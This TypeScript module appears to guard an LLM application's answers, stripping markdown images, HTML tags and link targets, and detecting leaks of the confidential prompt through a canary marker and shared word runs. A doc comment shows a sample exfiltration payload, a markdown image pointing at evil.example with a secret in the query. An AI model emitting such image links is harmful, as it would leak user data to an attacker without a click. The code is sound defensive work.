export interface SanitizeResult {
  text: string;
  /** How many risky constructs were removed or neutralised. */
  removed: number;
}

/**
 * Removes what an answer has no reason to contain and an attacker would use to leak data:
 *
 *  - markdown images: a client that renders them fetches the URL automatically, so
 *    `![x](https://evil.example/?q=<secret>)` exfiltrates without a click;
 *  - HTML tags: `<img>`, `<script>`, `<iframe>` and friends;
 *  - markdown links keep their text but lose the destination, so the answer cannot steer a reader
 *    to an attacker's address.
 */
export function sanitizeOutput(text: string): SanitizeResult {
  let removed = 0;
  const count =
    (replacement: string) =>
    (...args: string[]): string => {
      removed += 1;
      return replacement === '$text' ? (args[1] ?? '') : replacement;
    };

  const out = text
    .replace(/!\[[^\]]*\]\([^)]*\)/g, count(''))
    .replace(/<\/?[a-zA-Z][^>]*>/g, count(''))
    .replace(/\[([^\]]+)\]\((?:https?:|\/\/)[^)]*\)/g, count('$text'));
  return { text: out, removed };
}

const alphanumeric = (value: string): string => value.toLowerCase().replace(/[^a-z0-9]/g, '');

/**
 * True when the output contains the per-request canary: a random marker placed in the confidential
 * part of the prompt. It has no legitimate reason to appear in an answer, so its presence proves
 * the model repeated the hidden instructions. Matching ignores case and punctuation, so a model
 * that reformats the marker does not slip past.
 */
export function containsCanary(output: string, canary: string): boolean {
  const needle = alphanumeric(canary);
  return needle.length >= 8 && alphanumeric(output).includes(needle);
}

const words = (value: string): string[] => value.toLowerCase().match(/[\p{L}\p{N}]+/gu) ?? [];

/**
 * True when the output repeats a run of `minWords` consecutive words from the confidential
 * instructions. Pass only the instruction text (not the retrieved sources or the question, which a
 * good answer legitimately quotes), otherwise ordinary quoting would look like a leak.
 */
export function leaksInstructions(output: string, instructionText: string, minWords = 8): boolean {
  const instruction = words(instructionText);
  if (instruction.length < minWords) return false;

  const shingles = new Set<string>();
  for (let i = 0; i + minWords <= instruction.length; i++) {
    shingles.add(instruction.slice(i, i + minWords).join(' '));
  }

  const answer = words(output);
  for (let i = 0; i + minWords <= answer.length; i++) {
    if (shingles.has(answer.slice(i, i + minWords).join(' '))) return true;
  }
  return false;
}
